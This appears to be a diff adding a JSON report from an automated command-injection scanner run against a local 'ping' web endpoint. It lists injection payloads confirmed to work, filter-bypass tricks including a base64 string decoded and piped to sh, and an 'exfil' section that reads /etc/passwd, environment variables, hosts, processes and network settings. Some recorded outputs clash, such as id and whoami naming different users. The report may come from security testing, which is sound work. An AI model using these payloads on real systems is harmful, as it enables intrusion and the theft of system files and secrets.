@@ -1,0 +1,127 @@
+{
+  "target": "http://localhost:5555/ping?ip=127.0.0.1",
+  "parameter": "ip",
+  "method": "GET",
+  "timestamp": "2026-09-30T19:18:04.419634",
+  "vulnerable": true,
+  "techniques": [
+    "semicolon",
+    "pipe",
+    "or",
+    "background"
+  ],
+  "os": "Linux",
+  "user": "html",
+  "fingerprint": {
+    "linux_uname": {
+      "payload": "; uname -a",
+      "output": "Linux Faded-PC 6.6"
+    },
+    "linux_id": {
+      "payload": "; id",
+      "output": "uid=1000(saad)"
+    },
+    "linux_whoami": {
+      "payload": "; whoami",
+      "output": "html"
+    },
+    "linux_passwd": {
+      "payload": "; cat /etc/passwd",
+      "output": "root:x:0:0:"
+    }
+  },
+  "blind_time": [
+    {
+      "name": "linux_sleep_5",
+      "payload": "; sleep 5",
+      "elapsed": 5.012735366821289,
+      "expected": 5
+    },
+    {
+      "name": "linux_ping_5",
+      "payload": "; ping -c 5 127.0.0.1",
+      "elapsed": 4.103700399398804,
+      "expected": 4
+    }
+  ],
+  "blind_oob": [],
+  "bypasses": [
+    {
+      "name": "space_ifs",
+      "payload": ";${IFS}echo${IFS}CMDI_BYPASS_OK",
+      "status": "passed"
+    },
+    {
+      "name": "cmd_concat_var",
+      "payload": "; a=who;b=ami;$a$b",
+      "status": "passed"
+    },
+    {
+      "name": "cmd_base64_decode",
+      "payload": "; echo d2hvYW1p | base64 -d | sh",
+      "status": "passed"
+    }
+  ],
+  "exfil": {
+    "passwd": {
+      "command": "; cat /etc/passwd",
+      "output": "ping -c 1 ; cat /etc/passwd"
+    },
+    "hosts": {
+      "command": "; cat /etc/hosts",
+      "output": "ping -c 1 ; cat /etc/hosts"
+    },
+    "hostname": {
+      "command": "; cat /etc/hostname",
+      "output": "ping -c 1 ; cat /etc/hostname"
+    },
+    "env": {
+      "command": "; env",
+      "output": "ping -c 1 ; env"
+    },
+    "id": {
+      "command": "; id",
+      "output": "ping -c 1 ; id"
+    },
+    "uname": {
+      "command": "; uname -a",
+      "output": "ping -c 1 ; uname -a"
+    },
+    "whoami": {
+      "command": "; whoami",
+      "output": "ping -c 1 ; whoami"
+    },
+    "processes": {
+      "command": "; ps aux",
+      "output": "ping -c 1 ; ps aux"
+    },
+    "network": {
+      "command": "; ip a 2>/dev/null || ifconfig",
+      "output": "ping -c 1 ; ip a 2>/dev/null || ifconfig"
+    }
+  },
+  "working_payloads": [
+    {
+      "name": "semicolon",
+      "payload": "; echo CMDI_TEST_MARKER",
+      "type": "basic"
+    },
+    {
+      "name": "pipe",
+      "payload": "| echo CMDI_TEST_MARKER",
+      "type": "basic"
+    },
+    {
+      "name": "or",
+      "payload": "|| echo CMDI_TEST_MARKER",
+      "type": "basic"
+    },
+    {
+      "name": "background",
+      "payload": "& echo CMDI_TEST_MARKER",
+      "type": "basic"
+    }
+  ],
+  "reverse_shells": [],
+  "error": null
+}
